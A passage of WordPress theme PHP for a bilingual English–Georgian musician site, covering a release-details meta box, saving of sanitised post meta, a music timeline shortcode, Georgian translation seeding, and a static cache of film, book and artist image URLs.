    add_meta_box( 'zk_music_details', 'Release Details (English & Georgian)', 'zk_music_meta_callback', 'zk_music_release', 'normal', 'high' );
}
add_action( 'add_meta_boxes', 'zk_music_add_meta_box' );

function zk_music_meta_callback( $post ) {
    wp_nonce_field( 'zk_music_save_meta_data', 'zk_music_meta_nonce' );

    $subtitle       = get_post_meta( $post->ID, '_zk_subtitle', true );
    $subtitle_ka    = get_post_meta( $post->ID, '_zk_subtitle_ka', true );
    $date           = get_post_meta( $post->ID, '_zk_display_date', true );
    $date_ka        = get_post_meta( $post->ID, '_zk_display_date_ka', true );
    $genre          = get_post_meta( $post->ID, '_zk_genre', true );
    $genre_ka       = get_post_meta( $post->ID, '_zk_genre_ka', true );
    $media_type     = get_post_meta( $post->ID, '_zk_media_type', true );
    $media_id       = get_post_meta( $post->ID, '_zk_media_id', true );
    $spotify_url    = get_post_meta( $post->ID, '_zk_spotify_url', true );
    $more_url       = get_post_meta( $post->ID, '_zk_more_url', true );
    ?>
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
        <div>
            <label><strong>Display Date [EN]</strong> (e.g. 30.03.2026)</label><br>
            <input type="text" name="zk_display_date" value="<?php echo esc_attr( $date ); ?>" style="width:100%; margin-top:5px;" />
        </div>
        <div>
            <label><strong>Display Date [KA] (თარიღი ქართულად)</strong> (Optional)</label><br>
            <input type="text" name="zk_display_date_ka" value="<?php echo esc_attr( $date_ka ); ?>" placeholder="<?php echo esc_attr( $date ? $date : '30.03.2026' ); ?>" style="width:100%; margin-top:5px;" />
        </div>

        <div>
            <label><strong>Subtitle [EN]</strong> (e.g. From First Piano Album)</label><br>
            <input type="text" name="zk_subtitle" value="<?php echo esc_attr( $subtitle ); ?>" style="width:100%; margin-top:5px;" />
        </div>
        <div>
            <label><strong>Subtitle [KA] (ქვესათაური ქართულად)</strong></label><br>
            <input type="text" name="zk_subtitle_ka" value="<?php echo esc_attr( $subtitle_ka ); ?>" placeholder="მაგ. პირველი საფორტეპიანო ალბომიდან" style="width:100%; margin-top:5px;" />
        </div>

        <div>
            <label><strong>Genre / Tag [EN]</strong> (e.g. Piano, Classical)</label><br>
            <input type="text" name="zk_genre" value="<?php echo esc_attr( $genre ); ?>" style="width:100%; margin-top:5px;" />
        </div>
        <div>
            <label><strong>Genre / Tag [KA] (ჟანრი / თეგები ქართულად)</strong></label><br>
            <input type="text" name="zk_genre_ka" value="<?php echo esc_attr( $genre_ka ); ?>" placeholder="მაგ. ფორტეპიანო, კლასიკური" style="width:100%; margin-top:5px;" />
        </div>

        <div>
            <label><strong>Media Type</strong></label><br>
            <select name="zk_media_type" style="width:100%; margin-top:5px;">
                <option value="youtube" <?php selected( $media_type, 'youtube' ); ?>>YouTube</option>
                <option value="spotify" <?php selected( $media_type, 'spotify' ); ?>>Spotify</option>
                <option value="none" <?php selected( $media_type, 'none' ); ?>>None</option>
            </select>
        </div>
        <div>
            <label><strong>Media ID</strong> (YouTube/Spotify ID)</label><br>
            <input type="text" name="zk_media_id" value="<?php echo esc_attr( $media_id ); ?>" style="width:100%; margin-top:5px;" />
        </div>

        <div>
            <label><strong>Spotify Full URL</strong> (Leave empty for disabled button)</label><br>
            <input type="url" name="zk_spotify_url" value="<?php echo esc_url( $spotify_url ); ?>" style="width:100%; margin-top:5px;" />
        </div>
        <div>
            <label><strong>"See More" URL</strong> (Link to a blog post or external source. Leave empty to hide)</label><br>
            <input type="url" name="zk_more_url" value="<?php echo esc_url( $more_url ); ?>" style="width:100%; margin-top:5px;" />
        </div>
    </div>
    <p style="color: #666; font-size: 13px; margin-top: 15px;"><em>Note: The English title and description are edited in the standard WordPress title and text editor above. The Georgian title and description are in the "Georgian Translation (ქართული თარგმანი)" box below.</em></p>
    <?php
}

// 3. მონაცემების უსაფრთხოდ შენახვა ბაზაში
function zk_music_save_meta_data( $post_id ) {
    if ( ! isset( $_POST['zk_music_meta_nonce'] ) || ! wp_verify_nonce( $_POST['zk_music_meta_nonce'], 'zk_music_save_meta_data' ) ) return;
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;
    if ( ! current_user_can( 'edit_post', $post_id ) ) return;

    $fields = array(
            'zk_subtitle'        => '_zk_subtitle',
            'zk_subtitle_ka'     => '_zk_subtitle_ka',
            'zk_display_date'    => '_zk_display_date',
            'zk_display_date_ka' => '_zk_display_date_ka',
            'zk_genre'           => '_zk_genre',
            'zk_genre_ka'        => '_zk_genre_ka',
            'zk_media_type'      => '_zk_media_type',
            'zk_media_id'        => '_zk_media_id',
            'zk_spotify_url'     => '_zk_spotify_url',
            'zk_more_url'        => '_zk_more_url',
    );

    foreach ( $fields as $post_key => $meta_key ) {
        if ( isset( $_POST[ $post_key ] ) ) {
            update_post_meta( $post_id, $meta_key, sanitize_text_field( $_POST[ $post_key ] ) );
        }
    }
}
add_action( 'save_post', 'zk_music_save_meta_data' );

// 4. დინამიური შორთკოდი და JS-თან დაკავშირება (ორენოვანი მხარდაჭერა)
function zk_music_timeline_shortcode() {
    $args = array(
            'post_type'      => 'zk_music_release',
            'posts_per_page' => -1,
            'orderby'        => 'date',
            'order'          => 'DESC',
            'no_found_rows'  => true
    );
    $query = new WP_Query( $args );
    $music_data = array();
    $is_ka = ( function_exists('zk_get_current_language') && zk_get_current_language() === 'ka' );

    if ( $query->have_posts() ) {
        while ( $query->have_posts() ) {
            $query->the_post();
            $post_id = get_the_ID();

            $title        = get_the_title();
            $subtitle     = get_post_meta( $post_id, '_zk_subtitle', true );
            $genre        = get_post_meta( $post_id, '_zk_genre', true );
            $display_date = get_post_meta( $post_id, '_zk_display_date', true );
            $content      = get_the_content();

            if ( $is_ka ) {
                $title_ka = get_post_meta( $post_id, '_zk_title_ka', true );
                if ( ! empty( $title_ka ) ) {
                    $title = $title_ka;
                }
                $subtitle_ka = get_post_meta( $post_id, '_zk_subtitle_ka', true );
                if ( ! empty( $subtitle_ka ) ) {
                    $subtitle = $subtitle_ka;
                }
                $genre_ka = get_post_meta( $post_id, '_zk_genre_ka', true );
                if ( ! empty( $genre_ka ) ) {
                    $genre = $genre_ka;
                }
                $display_date_ka = get_post_meta( $post_id, '_zk_display_date_ka', true );
                if ( ! empty( $display_date_ka ) ) {
                    $display_date = $display_date_ka;
                } elseif ( function_exists( 'zk_translate_date_string_ka' ) ) {
                    $display_date = zk_translate_date_string_ka( $display_date );
                }
                $content_ka = get_post_meta( $post_id, '_zk_content_ka', true );
                if ( ! empty( $content_ka ) ) {
                    $content = $content_ka;
                }
            }

            $music_data[] = array(
                    'id'          => 'release-' . $post_id,
                    'displayDate' => $display_date,
                    'genre'       => $genre,
                    'title'       => $title,
                    'subtitle'    => $subtitle,
                    'description' => do_shortcode( wpautop( $content ) ),
                    'mediaType'   => get_post_meta( $post_id, '_zk_media_type', true ),
                    'mediaId'     => get_post_meta( $post_id, '_zk_media_id', true ),
                    'spotifyUrl'  => get_post_meta( $post_id, '_zk_spotify_url', true ),
                    'moreUrl'     => get_post_meta( $post_id, '_zk_more_url', true ),
            );
        }
        wp_reset_postdata();
    }

    $json_data = wp_json_encode( $music_data );
    $escaped_json = htmlspecialchars( $json_data, ENT_QUOTES, 'UTF-8' );

    $output = '<div class="zk-timeline-wrapper" id="zkMusicTimeline" data-lang="' . ( $is_ka ? 'ka' : 'en' ) . '" data-music-payload="' . $escaped_json . '"></div>';

    return $output;
}
add_shortcode( 'zk_music', 'zk_music_timeline_shortcode' );

// 5. პირველი რელიზის (The Last Nocturne) ქართული თარგმანის ავტო-ინიციალიზაცია
function zk_init_music_ka_translations() {
    $seeded = get_option( 'zk_music_seeded_ka_release_10689', false );
    if ( $seeded ) return;

    $releases = get_posts( array(
        'post_type'      => 'zk_music_release',
        'posts_per_page' => -1,
        'post_status'    => 'any',
    ) );

    if ( ! empty( $releases ) ) {
        foreach ( $releases as $post ) {
            $id = $post->ID;
            if ( ! get_post_meta( $id, '_zk_title_ka', true ) ) {
                update_post_meta( $id, '_zk_title_ka', $post->post_title );
            }
            if ( ! get_post_meta( $id, '_zk_subtitle_ka', true ) ) {
                $sub = get_post_meta( $id, '_zk_subtitle', true );
                if ( empty( $sub ) || $sub === 'From First Piano Album' ) {
                    update_post_meta( $id, '_zk_subtitle_ka', 'პირველი საფორტეპიანო ალბომიდან' );
                }
            }
            if ( ! get_post_meta( $id, '_zk_genre_ka', true ) ) {
                $g = get_post_meta( $id, '_zk_genre', true );
                if ( empty( $g ) || strpos( $g, 'Piano' ) !== false ) {
                    update_post_meta( $id, '_zk_genre_ka', 'ფორტეპიანო, კლასიკური' );
                }
            }
            if ( ! get_post_meta( $id, '_zk_content_ka', true ) ) {
                $content_ka = '<p>დიდი გადატვირთვის შემდეგ — მას შემდეგ, რაც წავშალე ჩემი ციფრული არსებობა და სიჩუმეში გავუჩინარდი — ვიცოდი, რომ ჩემი დაბრუნება სრულიად გულწრფელი უნდა ყოფილიყო. მე არ ვბრუნდები მასიური, ზედმეტად გადატვირთული ხმოვანი კედლით. ამის ნაცვლად, თავიდან ვიწყებ ყველაზე ექსპრესიული, შიშველი ინსტრუმენტით, რაც კი არსებობს.</p>' . "\n" .
                              '<p>ეს ჩემი პირველი ახალი მუსიკალური ნამუშევარია: 2-წუთიანი საფორტეპიანო კომპოზიცია, რომელიც ერთ დღეში დაიწერა. ის მცირეა. ის ინტიმურად პირადი და ახლობელია. და ამხელა სიჩუმის შემდეგ, ჩემთვის აბსოლუტურად ყველაფერს ნიშნავს.</p>' . "\n" .
                              '<p>ჩათვალეთ, რომ ეს ჩემი პირველი საფორტეპიანო ალბომის მშვიდი პროლოგია. ეს მხოლოდ დასაწყისია. წინ კიდევ უფრო მეტი ჟანრი, ვრცელი ხმოვანი სივრცეები და ბევრი ახალი მუსიკა გელით.</p>';
                update_post_meta( $id, '_zk_content_ka', $content_ka );
            }
        }
        update_option( 'zk_music_seeded_ka_release_10689', true );
    }
}
add_action( 'init', 'zk_init_music_ka_translations' );

/* ============================================================
   ABOUT PAGE - DYNAMIC TABS SHORTCODE
   ============================================================ */
function zk_get_og_image( $url, $scrape = true ) {
    if ( empty( $url ) || $url === '#' ) return '';

    // Normalize URL to ensure cache keys match between backend rendering and frontend AJAX
    $url = esc_url_raw( $url );
    if ( ! zk_is_allowed_og_source_url( $url ) ) {
        return '';
    }
    
    // Static Pre-cache for specific known items to eliminate load time / scraping overhead
    $static_cache = array(
        'https://www.imdb.com/title/tt0816692/' => 'https://m.media-amazon.com/images/M/MV5BYzdjMDAxZGItMjI2My00ODA1LTlkNzItOWFjMDU5ZDJlYWY3XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt0338013/' => 'https://m.media-amazon.com/images/M/MV5BMTY4NzcwODg3Nl5BMl5BanBnXkFtZTcwNTEwOTMyMw@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt15398776/' => 'https://m.media-amazon.com/images/M/MV5BN2JkMDc5MGQtZjg3YS00NmFiLWIyZmQtZTJmNTM5MjVmYTQ4XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt13238346/' => 'https://m.media-amazon.com/images/M/MV5BYjQyMTNhNjUtN2VmYy00NWRhLTkwOTctMGVmNTBmNDIxYjZhXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt27503384/' => 'https://m.media-amazon.com/images/M/MV5BNGVmODFkM2MtOTEzMy00MjFjLThjZmYtODMxZmI1MzcyNDkyXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt4550098/' => 'https://m.media-amazon.com/images/M/MV5BMTYwMzMwMzgxNl5BMl5BanBnXkFtZTgwMTA0MTUzMDI@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt0112471/' => 'https://m.media-amazon.com/images/M/MV5BZDZhZmI1ZTUtYWI3NC00NTMwLTk3NWMtNDc0OGNjM2I0ZjlmXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt1213641/' => 'https://m.media-amazon.com/images/M/MV5BYmIzYmViN2UtMDRhYy00OTMwLWI5YzctMTQxYzg2ODMwMTIwXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt2543164/' => 'https://m.media-amazon.com/images/M/MV5BMTExMzU0ODcxNDheQTJeQWpwZ15BbWU4MDE1OTI4MzAy._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt6265828/' => 'https://m.media-amazon.com/images/M/MV5BMzcyNTc1ODQzMF5BMl5BanBnXkFtZTgwNTgzMzY4MTI@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt0470752/' => 'https://m.media-amazon.com/images/M/MV5BMTUxNzc0OTIxMV5BMl5BanBnXkFtZTgwNDI3NzU2NDE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt1798709/' => 'https://m.media-amazon.com/images/M/MV5BMjA1Nzk0OTM2OF5BMl5BanBnXkFtZTgwNjU2NjEwMDE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt2699128/' => 'https://m.media-amazon.com/images/M/MV5BODAwNjJkZDctOWM5Ny00ODY0LWJjZDItMTE3YWUxMWJkMGJkXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt19231492/' => 'https://m.media-amazon.com/images/M/MV5BMzQwNDI0NTAtN2JjOC00MmE3LTg1Y2EtOTdjZDNhMDhjMmNhXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt13016388/' => 'https://m.media-amazon.com/images/M/MV5BMDdkYWZiZWYtMzA0Yi00NzNlLThkODktY2Q3N2NjN2ExZmMwXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt0460649/' => 'https://m.media-amazon.com/images/M/MV5BNjg1MDQ5MjQ2N15BMl5BanBnXkFtZTYwNjI5NjA3._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt0386676/' => 'https://m.media-amazon.com/images/M/MV5BZjQwYzBlYzUtZjhhOS00ZDQ0LWE0NzAtYTk4MjgzZTNkZWEzXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt26471411/' => 'https://m.media-amazon.com/images/M/MV5BNDU5NTY2YjgtNGZjNy00MTk2LWExM2QtOTdlMjhjZTE5MTMxXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt26258202/' => 'https://m.media-amazon.com/images/M/MV5BMmJkMDlkNDYtYTU2NS00NTUxLTg1NWUtMzM2NWU3MWEyNGNhXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt22202452/' => 'https://m.media-amazon.com/images/M/MV5BOWNlM2E1MDMtYmI5MS00NDQ1LWI3NTctM2VlNjQ5OTAxYTNmXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt2085059/' => 'https://m.media-amazon.com/images/M/MV5BODcxMWI2NDMtYTc3NC00OTZjLWFmNmUtM2NmY2I1ODkxYzczXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt8134186/' => 'https://m.media-amazon.com/images/M/MV5BMDBmMGFiNGYtNDRjMS00NzJlLWE5YjctOTkzNDM0ODM5YTRlXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt2861424/' => 'https://m.media-amazon.com/images/M/MV5BZGQyZjk2MzMtMTcyNC00NGU3LTlmNjItNDExMWM4ZDFhYmQ2XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt3398228/' => 'https://m.media-amazon.com/images/M/MV5BZmMwMDlkNTEtMmQzZS00ODQ0LWJlZmItOTgwYWMwZGM4MzFiXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt8690918/' => 'https://m.media-amazon.com/images/M/MV5BYzczMDI5NzQtODdmYS00NTcwLTg1MTYtNmU5NWY1NDA5ZGRkXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/title/tt9140560/' => 'https://m.media-amazon.com/images/M/MV5BZTMxMmM1ODItMTZiMS00NjI1LWEwODctMjQ4ZjY4ODliNDI0XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.goodreads.com/book/show/55030.Cosmos' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1388620656i/55030.jpg',
        'https://www.goodreads.com/book/show/23692271-sapiens' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1703329310i/23692271.jpg',
        'https://www.goodreads.com/book/show/40961427-1984' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1532714506i/40961427.jpg',
        'https://www.goodreads.com/book/show/27833670-dark-matter' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1472119680i/27833670.jpg',
        'https://www.goodreads.com/book/show/20518872-the-three-body-problem' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1415428227i/20518872.jpg',
        'https://www.goodreads.com/book/show/5129.Brave_New_World' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1575509280i/5129.jpg',
        'https://www.goodreads.com/book/show/10569269' => 'https://m.media-amazon.com/images/S/compressed.photo.goodreads.com/books/1315413252i/10569269.jpg',
        'https://www.goodreads.com/author/show/5223.Franz_Kafka' => 'https://images.gr-assets.com/authors/1615573688p8/5223.jpg',
        'https://www.goodreads.com/author/show/3354.Haruki_Murakami' => 'https://images.gr-assets.com/authors/1615497402p8/3354.jpg',
        'https://www.goodreads.com/author/show/10538.Carl_Sagan' => 'https://images.gr-assets.com/authors/1475953320p8/10538.jpg',
        'https://www.goodreads.com/author/show/500.Jorge_Luis_Borges' => 'https://images.gr-assets.com/authors/1652029755p8/500.jpg',
        'https://www.goodreads.com/author/show/2778055.Kurt_Vonnegut' => 'https://images.gr-assets.com/authors/1433582280p8/2778055.jpg',
        'https://www.goodreads.com/author/show/130698.Ted_Chiang' => 'https://images.gr-assets.com/authors/1399023404p8/130698.jpg',
        'https://www.goodreads.com/author/show/957894.Albert_Camus' => 'https://images.gr-assets.com/authors/1686463588p8/957894.jpg',
        'https://www.goodreads.com/author/show/5780686.Liu_Cixin' => 'https://images.gr-assets.com/authors/1454974329p8/5780686.jpg',
        'https://www.goodreads.com/author/show/6343.Milan_Kundera' => 'https://images.gr-assets.com/authors/1729099820p8/6343.jpg',
        'https://www.goodreads.com/author/show/4.Douglas_Adams' => 'https://images.gr-assets.com/authors/1616277702p8/4.jpg',
        'https://www.goodreads.com/author/show/1834895.Nodar_Dumbadze' => 'https://images.gr-assets.com/authors/1321911777p8/1834895.jpg',
        'https://www.goodreads.com/author/show/5553615.Vazha_Pshavela' => 'https://images.gr-assets.com/authors/1357724629p8/5553615.jpg',
        'https://www.goodreads.com/author/show/4668876.Guram_Dochanashvili' => 'https://images.gr-assets.com/authors/1298450140p8/4668876.jpg',
        'https://www.imdb.com/name/nm0634240/' => 'https://m.media-amazon.com/images/M/MV5BNjE3NDQyOTYyMV5BMl5BanBnXkFtZTcwODcyODU2Mw@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000233/' => 'https://m.media-amazon.com/images/M/MV5BMTgyMjI3ODA3Nl5BMl5BanBnXkFtZTcwNzY2MDYxOQ@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000399/' => 'https://m.media-amazon.com/images/M/MV5BMTc1NDkwMTQ2MF5BMl5BanBnXkFtZTcwMzY0ODkyMg@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000631/' => 'https://m.media-amazon.com/images/M/MV5BNDM1OWUyZDktZGJmYS00MjQxLWI1OTItY2M4MWViM2NmOWM0XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0898288/' => 'https://m.media-amazon.com/images/M/MV5BMzU2MDk5MDI2MF5BMl5BanBnXkFtZTcwNDkwMjMzNA@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0319213/' => 'https://m.media-amazon.com/images/M/MV5BNTUyNzUxOTAxMV5BMl5BanBnXkFtZTcwNzk0MDM0Nw@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000694/' => 'https://m.media-amazon.com/images/M/MV5BMTYzNTgyNzQ1MV5BMl5BanBnXkFtZTYwMTQwMjc1._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0307497/' => 'https://m.media-amazon.com/images/M/MV5BMTU1ODcxMzA2NF5BMl5BanBnXkFtZTgwNjc2NDk3NTM@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000759/' => 'https://m.media-amazon.com/images/M/MV5BMTQwNjc5NjY2NV5BMl5BanBnXkFtZTcwNDIxMzg1MQ@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0094435' => 'https://m.media-amazon.com/images/M/MV5BYmZhZTY3ZGEtOTA1ZC00ODcwLTg2ZjMtODViNzIwNzAxMDVmXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0614165/' => 'https://m.media-amazon.com/images/M/MV5BNWM3NTg0NGYtNTFmYS00OWY1LTlkNTgtNzZlMWY4OGRmMmEzXkEyXkFqcGc@._V1_CR1542,983,1114,1670_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0331516/' => 'https://m.media-amazon.com/images/M/MV5BMTQzMjkwNTQ2OF5BMl5BanBnXkFtZTgwNTQ4MTQ4MTE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000190/' => 'https://m.media-amazon.com/images/M/MV5BMTg0MDc3ODUwOV5BMl5BanBnXkFtZTcwMTk2NjY4Nw@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000120/' => 'https://m.media-amazon.com/images/M/MV5BMTQwMjAwNzI0M15BMl5BanBnXkFtZTcwOTY1MTMyOQ@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000164/' => 'https://m.media-amazon.com/images/M/MV5BMTg5ODk1NTc5Ml5BMl5BanBnXkFtZTYwMjAwOTI4._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000243/' => 'https://m.media-amazon.com/images/M/MV5BMjExMjY5ODYyM15BMl5BanBnXkFtZTgwOTU0OTg0NDM@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000576/' => 'https://m.media-amazon.com/images/M/MV5BMTc1NjMzMjY3NF5BMl5BanBnXkFtZTcwMzkxNjQzMg@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0842770/' => 'https://m.media-amazon.com/images/M/MV5BMTM4NzMzMTkwNV5BMl5BanBnXkFtZTcwMzU4MDg1Mw@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000151/' => 'https://m.media-amazon.com/images/M/MV5BMTc0MDMyMzI2OF5BMl5BanBnXkFtZTcwMzM2OTk1MQ@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000136/' => 'https://m.media-amazon.com/images/M/MV5BZjA3NzZiZDktZjc2My00MzY2LThhOWMtZGFjYzg4ZDI2ZWVmXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0004778/' => 'https://m.media-amazon.com/images/M/MV5BMjI3ODkxMjU3OF5BMl5BanBnXkFtZTgwMTk2Njk3MTE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0350453/' => 'https://m.media-amazon.com/images/M/MV5BNjA0MTU2NDY3MF5BMl5BanBnXkFtZTgwNDU4ODkzMzE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm1089991/' => 'https://m.media-amazon.com/images/M/MV5BYTU0NjUyMjktNTBkNS00ZWFjLTgyZmUtZjVhMmU1YTVkOTM2XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0647634/' => 'https://m.media-amazon.com/images/M/MV5BMjEzMjA0ODk1OF5BMl5BanBnXkFtZTcwMTA4ODM3OQ@@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm5896355/' => 'https://m.media-amazon.com/images/M/MV5BMGZjYzcxNDEtNTU1Yi00Nzc3LTlhZjQtZTUwZDQxNjQ5MDIzXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000375/' => 'https://m.media-amazon.com/images/M/MV5BNzg1MTUyNDYxOF5BMl5BanBnXkFtZTgwNTQ4MTE2MjE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm0000168/' => 'https://m.media-amazon.com/images/M/MV5BMTQ1NTQwMTYxNl5BMl5BanBnXkFtZTYwMjA1MzY1._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm1212722/' => 'https://m.media-amazon.com/images/M/MV5BMjE0MDkzMDQwOF5BMl5BanBnXkFtZTgwOTE1Mjg1MzE@._V1_FMjpg_UX1000_.jpg',
        'https://www.imdb.com/name/nm2858875/' => 'https://m.media-amazon.com/images/M/MV5BZTIwYmNjMjctYTAyZi00Njg0LWJmZWQtZTc1MmZjZjBiMmQ4XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg',
        'https://open.spotify.com/artist/0YC192cP3KPCRWx8zr8MfZ' => 'https://i.scdn.co/image/ab6761610000e5eb371632043a8c12bb7eeeaf9d',
        'https://open.spotify.com/artist/2VZNmg4vCnew4Pavo8zDdW' => 'https://i.scdn.co/image/ab6761610000e5eb8dee498089aaed97d680c5b7',
        'https://open.spotify.com/artist/3dRfiJ2650SZu6GbydcHNb?si=YD9qGbPnTvKomAeJDdAQYw' => 'https://i.scdn.co/image/ab6761610000e5eb86b13e4d2e65ebf694384ef4',
        'https://open.spotify.com/artist/24eDfi2MSYo3A87hCcgpIL?si=wmDuDih9TjO8RevRBjw2zw' => 'https://i.scdn.co/image/e7a97b420e09f4f125cd3e14fca5e7ea174e74e0',
        'https://open.spotify.com/artist/5RGAUCWFZyymaMSAZJeice?si=rxlv9FxpSB-V6ywt6BjDUQ' => 'https://i.scdn.co/image/ab6761610000e5eb1470dc2e1d28f770429e6b55',
        'https://open.spotify.com/artist/6H77vD9YyhyxHBTkRpbMBk?si=UHhgPDNpQeyM8c88EXpKrQ' => 'https://i.scdn.co/image/ab6761610000e5eb3d65ee13ef224f8dacdd4b92',
        'https://open.spotify.com/artist/5JJclMMPi2YgEKjJY9AjbB?si=964598b52b074a48' => 'https://i.scdn.co/image/ab6761610000e5ebc492b4c01b15d1d1d5b4197b',
        'https://open.spotify.com/artist/27mChCxMpfmLnXhdD07DLZ?si=761291d39a3848a9' => 'https://i.scdn.co/image/ab6761610000e5ebad325cbd8549657e98e32126',
        'https://open.spotify.com/artist/72udTJKu1pGovvS9aCYGMI?si=6a572eb500344c23' => 'https://i.scdn.co/image/ab6761610000e5ebac6f689a8d398c34d3d8a412',
        'https://open.spotify.com/artist/0WSSKmoRbxqLf3MnXInQ2J?si=9e2722f3c65f4ee7' => 'https://i.scdn.co/image/ab6761610000e5eb876151cdb606003d1915ac5f',
        'https://open.spotify.com/artist/3ohcHMuUq1717s8AH17hfT?si=dcced7a7f1404126' => 'https://i.scdn.co/image/ab6761610000e5eb9c0f0686fcc3c0c3883d9030',
        'https://open.spotify.com/artist/0jhEMuo7mHO0SS3ikkimR5?si=AbiB4WEIREO412IV92wR5Q' => 'https://i.scdn.co/image/ab6761610000e5eb50ec597bb128725715f811f9',
        'https://open.spotify.com/artist/2yIj6bZPIqv5WIYjD5vWZm?si=u7GpLIPTSgG2tl8pCc2bYA' => 'https://i.scdn.co/image/ab6761610000e5eb3816f5fa1bf9ea15446f64da',
        'https://open.spotify.com/artist/6AE7CSJUwDMnTXV4yKVLLv?si=H5Odk7UZTyGa_ijnFGgRCg' => 'https://i.scdn.co/image/ab6761610000e5ebfa716901443b8c4a40030f9b',
        'https://open.spotify.com/artist/4Z8W4fKeB5YxbusRsdQVPb?si=e493d4eaa09c492e' => 'https://i.scdn.co/image/ab6761610000e5eb4104fbd80f1f795728abbd59',
        'https://open.spotify.com/artist/3WrFJ7ztbogyGnTHbHJFl2?si=d0200e0555284a70' => 'https://i.scdn.co/image/ab6761610000e5eb119b61b35985e3b957c5ecb7',
        'https://open.spotify.com/artist/0k17h0D3J5VfsdmQ1iZtE9?si=5ab41604ed8f4660' => 'https://i.scdn.co/image/ab6761610000e5eb3c9e8c67b087ba0cb5923b78',
        'https://open.spotify.com/artist/1dfeR4HaWDbWqFHLkxsg1d?si=0a1a0288612d4336' => 'https://i.scdn.co/image/ab6772690000c46c47488c35a509d42072c23976',
        'https://open.spotify.com/artist/08GQAI4eElDnROBrJRGE0X?si=2ca6606ccc7f4275' => 'https://i.scdn.co/image/ab6761610000e5ebc8752dd511cda8c31e9daee8',
        'https://open.spotify.com/artist/1Dvfqq39HxvCJ3GvfeIFuT?si=b244137aa2aa4653' => 'https://i.scdn.co/image/ab6761610000e5eb9b92861a97e05664994bf21e',
        'https://open.spotify.com/artist/6FXMGgJwohJLUSr5nVlf9X?si=iiZsHDVdTnucl_lX6OsNow' => 'https://i.scdn.co/image/c8bbeedb05f38ae5cb982a7daf4bf7129cca892c',
